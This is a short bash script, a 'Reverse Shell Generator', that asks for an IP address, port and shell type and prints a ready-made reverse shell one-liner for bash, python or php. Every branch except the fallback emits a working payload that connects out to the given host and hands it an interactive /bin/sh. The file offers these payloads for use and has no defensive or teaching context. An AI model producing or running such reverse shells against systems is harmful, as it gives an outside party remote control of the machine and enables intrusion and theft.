#!/bin/bash

echo "Reverse Shell Generator"
echo "------------------------"
read -p "Enter target IP: " ip
read -p "Enter target port: " port
read -p "Enter shell type (bash, python, php, etc.): " type

case $type in
    "bash")
        echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
        ;;
    "python")
        echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        ;;
    "php")
        echo "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ;;
    *)
        echo "Shell type not recognized. Please choose one of the supported types."
        ;;
esac
